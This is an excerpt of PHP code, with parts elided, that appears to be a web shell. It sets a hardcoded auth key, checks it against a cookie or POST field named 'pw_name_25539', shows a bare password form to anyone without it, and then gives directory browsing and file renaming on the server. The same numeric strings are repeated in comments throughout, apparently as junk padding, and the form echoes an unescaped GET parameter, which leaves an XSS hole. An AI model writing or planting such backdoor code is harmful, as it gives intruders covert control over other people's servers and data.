...
$auth_key = "d65409b29d9f030045f616cfab6a1468";
...
$pass = false;
if (isset($_COOKIE['pw_name_25539'])) {
    if(($_COOKIE['pw_name_25539']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_25539'])) {
        if(($_POST['pw_name_25539']) == $auth_key) {
            setcookie("pw_name_25539", $_POST['pw_name_25539']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_25539' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726408450735631 1726408450762380 1726408450712718 1726408450813249
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726408450735631 1726408450762380 1726408450712718 1726408450813249
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726408450735631 1726408450762380 1726408450712718 1726408450813249
            $name = PATH . "/" . $_GET['r'];
